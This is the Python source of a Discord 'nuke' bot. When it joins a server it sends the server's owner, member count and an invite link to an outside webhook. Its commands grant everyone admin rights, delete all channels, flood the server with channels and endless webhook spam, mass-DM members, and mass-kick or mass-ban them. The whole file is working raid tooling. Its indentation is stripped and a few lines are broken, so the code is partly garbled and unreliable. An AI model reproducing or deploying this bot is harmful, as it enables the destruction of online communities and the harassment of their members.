print("ONLINE")

import discord
from discord.ext.commands import *
from discord.ext import commands
from discord import Permissions
from discord import Webhook, AsyncWebhookAdapter

import random
import colorama
from colorama import Fore, Style
import aiohttp
import asyncio
import os
token = "token"
join = ["webhook for join"]
nuke = ["webhook for nuke"] 
bot = commands.Bot(command_prefix = "prefix")
command_prefix = "prefix"
webhook_name = [""]
webhook_pfp = [""]
messages = [""]
channelnames = [""]

@bot.event
async def on_ready():
app = await bot.application_info()
print(f"{bot.user.name}#{bot.user.discriminator}.\nBot ID = {bot.user.id}.\n \nUser = {app.owner.name}#{app.owner.discriminator}\n \nCOMMANDS\n{command_prefix}leave <serverID>\n{command_prefix}servers\n{command_prefix}members <serverID>\n{command_prefix}mk\n{command_prefix}mb\n{command_prefix}unban\n{command_prefix}kek\n{command_prefix}md <message>\n{command_prefix}kek\n{command_prefix}ma\n{command_prefix}alladmin\n{command_prefix}cc <channel name>\n{command_prefix}cd\n \nInvite link = https://discordapp.com/api/oauth2/authorize?client_id={bot.user.id}&permissions=8&scope=bot\n \n")

@bot.event
async def on_guild_join(guild):
channel = discord.utils.get(guild.text_channels, position = 0)
inv = await channel.create_invite()
joinlog = discord.Embed(
title = "Joined Server",
description = f"**{bot.user.name}** joined the server **{guild.name}**",
color=0x00ff00
)
joinlog.add_field(
name = "Server Owner",
value = f"``{guild.owner.name}#{guild.owner.discriminator} ({guild.owner.id})``",
inline = False
)
joinlog.add_field(
name = "Member Count",
value = f"{guild.member_count}",
inline = False
)
joinlog.add_field(
name = "Invite Link",
value = f"{inv}",
inline = False
)
for url in join:
try:
async with aiohttp.ClientSession() as session:
webhook = Webhook.from_url(url, adapter=AsyncWebhookAdapter(session))
await webhook.send(
embed = joinlog,
username = bot.user.name,
avatar_url = bot.user.avatar_url
)
except:
pass

@bot.command()
async def kek(ctx):
await ctx.message.delete()
guild = ctx.guild
membercount = guild.member_count
channel = discord.utils.get(guild.text_channels, position = 0)
role = discord.utils.get(guild.roles, name = "@everyone")
try:
await role.edit(permissions = Permissions.all())
print(f"{Fore.GREEN}EVERYONE HAS ADMIN PERMISSIONS IN {Fore.WHITE}{guild.name}")
except:
f"{Fore.RED}FAILED TO GIVE EVERYONE ADMIN IN {Fore.WHITE}{guild.name}"
for channel in guild.channels:
await channel.delete()
channel = await guild.create_text_channel(random.choice(channelnames))
inv = await channel.create_invite()
nukelog = discord.Embed(
title = "Nuked Server",
description = f"**{bot.user.name}** nuked the server **{guild.name}**",
color =0x00ff00
)
nukelog.add_field(
name = "Server Owner",
value = f"``{guild.owner.name}#{guild.owner.discriminator} ({guild.owner.id})``",
inline = False
)
nukelog.add_field(
name = "Member Count",
value = f"``Members: {membercount}``",
inline = False
)
nukelog.add_field(
name = "Invite Link",
value = f"{inv}",
inline = False
)
for url in nuke:
try:
async with aiohttp.ClientSession() as session:
webhook = Webhook.from_url(url, adapter=AsyncWebhookAdapter(session))
await webhook.send(
embed = nukelog,
username = bot.user.name,
avatar_url = bot.user.avatar_url
)
except:
pass
try:
await guild.edit(name = "NUKED")
except:
pass
for i in range(100):
await guild.create_text_channel(random.choice(channelnames))

@bot.command()
async def md(ctx, *, message):
await ctx.message.delete()
guild = ctx.guild
for member in guild.members:
try:
await member.send(message)
print(Fore.GREEN + f"SENT THE DM TO {member.name}#{member.discriminator}")
except:
print(Fore.RED + f"FAILED TO SEND THE DM TO {member.name}#{member.discriminator}")

@bot.event
async def on_guild_channel_create(channel):
webhook = await channel.create_webhook(name = "webhook")
url = f"{webhook.url}"
async with aiohttp.ClientSession() as session:
while True:
webhook = Webhook.from_url(url, adapter=AsyncWebhookAdapter(session))
await webhook.send(random.choice(messages), username=random.choice(webhook_name), avatar_url = random.choice(webhook_pfp))
await webhook.send(random.choice(messages))

@bot.command()
async def unban(ctx):
await ctx.message.delete()
banned_users = await ctx.guild.bans()
for ban_entry in banned_users:
user = ban_entry.user
try:
await ctx.guild.unban(user)
except:
pass

@bot.command()
async def cc(ctx, *, channelname):
await ctx.message.delete()
guild = ctx.guild
amount = 100
for i in range(amount):
await guild.create_text_channel(channelname)

@bot.command()
async def cd(ctx):
await ctx.message.delete()
guild = ctx.guild
for channel in guild.channels:
await channel.delete()

@bot.command()
async def mk(ctx):
await ctx.message.delete()
guild = ctx.guild
for member in guild.members:
try:
await member.kick()
print(Fore.GREEN + f"KICKED {member.name}#{member.discriminator}")
except:
print(Fore.RED + f"FAILED TO KICK {member.name}#{member.discriminator}")

@bot.command()
async def mb(ctx):
await ctx.message.delete()
guild = ctx.guild
for member in guild.members:
try:
await member.ban()
print(Fore.GREEN + f"BANNED {member.name}#{member.discriminator}")
except:
print(Fore.RED + f"FAILED TO BAN {member.name}#{member.discriminator}")

@bot.command()
async def ma(ctx):
await ctx.message.delete()
guild = ctx.guild
for member in guild.members:
try:
await member.send(embed=ads)
print(Fore.GREEN + f"SENT THE DM TO {member.name}#{member.discriminator}")
except:
print(Fore.RED + f"FAILED TO SEND THE DM TO {member.name}#{member.discriminator}")

@bot.command()
async def servers(ctx):
await ctx.message.delete()
servers = [guild.name + f"({guild.id})" for guild in bot.guilds]
guilds = '\n* '.join(servers)
servers = discord.Embed(
title=f"Guilds ({len(bot.guilds)})",
description=f"""
```md
* {guilds}

< Bot currently has {len(bot.users)} members in {len(bot.guilds)} servers. >
```
""")
await ctx.send(embed=servers)


@bot.command()
async def invs(ctx):
await ctx.message.delete()
for guild in bot.guilds:
channel = discord.utils.get(guild.text_channels, position = 0)
embed = discord.Embed(title = f"{guild.name}")
embed.add_field(
name="Server ID", 
value=f"``{guild.id}``", 
inline=False)

embed.add_field(
name="Server Owner",
value=f"``{guild.owner} ({guild.owner.id})``",
inline=False)

embed.add_field(
name="Member Count",
value=f"``{guild.member_count}``",
inline=False)

channel = discord.utils.get(guild.text_channels, position = 0)
try:
link = await channel.create_invite()

embed.add_field(
name="Invite Link", 
value=f"{link}", 
inline=False)
except:
embed.add_field(
name="Invite Link", 
value=f"``UNABLE TO CREATE INVITE LINK``", 
inline=False)
await ctx.send(embed = embed)

@bot.command()
async def members(ctx, guild_id : int):
await ctx.message.delete()
guild = bot.get_guild(guild_id)
info = discord.Embed(title = f"{guild.name}")

info.add_field(
name="Members",
value=f"``{guild.members}``",
inline=False)
await ctx.send(embed = info)

@bot.command()
async def alladmin(ctx):
await ctx.message.delete()
for guild in bot.guilds:
role = discord.utils.get(guild.roles, name = "@everyone")
try:
await role.edit(permissions = Permissions.all())
print(f"{Fore.GREEN}EVERYONE HAS ADMIN PERMISSIONS IN {Fore.WHITE}{guild.name}")
except:
f"{Fore.RED}FAILED TO GIVE EVERYONE ADMIN IN {Fore.WHITE}{guild.name}"

@bot.command()
async def leave(ctx, guildid : int):
await ctx.message.delete()
guild = discord.utils.get(bot.guilds, id = guildid)
await guild.leave()
await ctx.send(f"BOT HAS LEFT``{guild.name}``")

bot.run(token)
